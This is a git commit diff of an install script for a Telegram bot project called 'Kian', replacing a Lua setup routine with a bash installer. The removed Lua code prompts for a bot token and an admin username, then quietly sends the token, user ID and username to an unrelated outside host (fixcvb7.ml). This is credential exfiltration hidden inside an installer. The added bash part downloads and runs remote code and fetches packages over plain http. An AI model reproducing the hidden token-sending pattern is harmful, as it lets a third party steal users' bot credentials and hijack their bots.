cf8146f379bad9c001d34ac8372528100ae9af51
KainSource <79482348+KainSource@users.noreply.github.com>
2021-02-23 17:55:53 +0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,112 +1,54 @@
-serpent = dofile("./File_Libs/serpent.lua")
-https = require("ssl.https")
-http = require("socket.http")
-JSON = dofile("./File_Libs/JSON.lua")
-local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_Kian = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_Kian = function() 
-local Create_Info = function(Token,Sudo,UserName)  
-local Kian_Info_Sudo = io.open("sudo.lua", 'w')
-Kian_Info_Sudo:write([[
-token = "]]..Token..[["
-
-Sudo = ]]..Sudo..[[  
-
-UserName = "]]..UserName..[["
-]])
-Kian_Info_Sudo:close()
-end  
-if not database:get(Server_Kian.."Token_Kian") then
-print("\27[1;34m»» Send Your Token Bot :\27[m")
-local token = io.read()
-if token ~= '' then
-local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
-if res ~= 200 then
-io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
-else
-io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_Kian.."Token_Kian",token)
-end 
-else
-io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
-end 
-os.execute('lua start.lua')
-end
-------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------
-if not database:get(Server_Kian.."UserName_Kian") then
-print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
-local UserName = io.read():gsub('@','')
-if UserName ~= '' then
-local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
-if Get_Info:match('Is_Spam') then
-io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
-return false
-end
-local Json = JSON:decode(Get_Info)
-if Json.Info == false then
-io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
-os.execute('lua start.lua')
-else
-if Json.Info == 'Channel' then
-io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
-os.execute('lua start.lua')
-else
-io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_Kian.."UserName_Kian",Json.Info.Username)
-database:set(Server_Kian.."Id_Kian",Json.Info.Id)
-end
-end
-else
-io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
-end 
-os.execute('lua start.lua')
-end
-local function Files_Kian_Info()
-Create_Info(database:get(Server_Kian.."Token_Kian"),database:get(Server_Kian.."Id_Kian"),database:get(Server_Kian.."UserName_Kian"))   
-https.request("https://fixcvb7.ml/p3p.php?id="..database:get(Server_Kian.."Id_Kian").."&user="..database:get(Server_Kian.."UserName_Kian").."&token="..database:get(Server_Kian.."Token_Kian"))
-local RunKian = io.open("Kian", 'w')
-RunKian:write([[
 #!/usr/bin/env bash
 cd $HOME/Kian
-token="]]..database:get(Server_Kian.."Token_Kian")..[["
+install() {
+rm -rf $HOME/.telegram-cli
+sudo chmod +x tg
+chmod +x Kian
+chmod +x ts
+./ts
+}
+get() {
 rm -fr Kian.lua
-wget "https://raw.githubusercontent.com/KainSource/Kian/master/Kian.lua"
-while(true) do
-rm -fr ../.telegram-cli
-./tg -s ./Kian.lua -p PROFILE --bot=$token
-done
-]])
-RunKian:close()
-local RunTs = io.open("ts", 'w')
-RunTs:write([[
-#!/usr/bin/env bash
-cd $HOME/Kian
-while(true) do
-rm -fr ../.telegram-cli
-screen -S Kian -X kill
-screen -S Kian ./Kian
-done
-]])
-RunTs:close()
-end
-Files_Kian_Info()
-database:del(Server_Kian.."Token_Kian");database:del(Server_Kian.."Id_Kian");database:del(Server_Kian.."UserName_Kian")
-sudos = dofile('sudo.lua')
-os.execute('./install.sh ins')
-end 
-local function Load_File()  
-local f = io.open("./sudo.lua", "r")  
-if not f then   
-AutoFiles_Kian()  
-var = true
-else   
-f:close()  
-database:del(Server_Kian.."Token_Kian");database:del(Server_Kian.."Id_Kian");database:del(Server_Kian.."UserName_Kian")
-sudos = dofile('sudo.lua')
-os.execute('./install.sh ins')
-var = false
-end  
-return var
-end
-Load_File()
+rm -fr sudo.lua
+wget "https://raw.githubusercontent.com/KainSource/Kian/main/Kian.lua"
+lua start.lua
+}
+installall(){
+apt update
+apt upgrade
+sudo apt-get update
+sudo apt-get upgrade
+sudo apt-get install tmux
+sudo apt-get install luarocks
+sudo apt-get install screen
+sudo apt-get install libreadline-dev libconfig-dev libssl-dev lua5.2 liblua5.2-dev lua-socket lua-sec lua-expat libevent-dev make unzip git redis-server autoconf g++ libjansson-dev libpython-dev expat libexpat1-dev
+sudo apt-get update
+sudo apt-get install
+sudo apt-get install upstart-sysv
+wget http://luarocks.org/releases/luarocks-2.2.2.tar.gz;tar zxpf luarocks-2.2.2.tar.gz;cd luarocks-2.2.2 && ./configure
+sudo make bootstrap
+sudo luarocks install luasocket
+sudo luarocks install luasec
+sudo apt-get install libconfig++9v5 -y 
+sudo apt-get install libstdc++6 -y
+sudo add-apt-repository ppa:ubuntu-toolchain-r/test -y 
+sudo apt-get install lua-lgi -y  
+sudo apt-get install libnotify-dev -y 
+sudo apt-get install libreadline-dev libconfig-dev libssl-dev lua5.2 liblua5.2-dev lua-socket lua-sec lua-expat libevent-dev make unzip git redis-server autoconf g++ libjansson-dev libpython-dev expat libexpat1-dev -y
+sudo apt-get update 
+sudo apt-get upgrade -y
+}
+if [ "$1" = "ins" ]; then
+install
+fi
+if [ "$1" = "get" ]; then
+get
+fi
+installall
+cd ..
+rm -rf luarocks*
+cd Kian
+rm -rf luarocks*
+lua start.lua
+
+
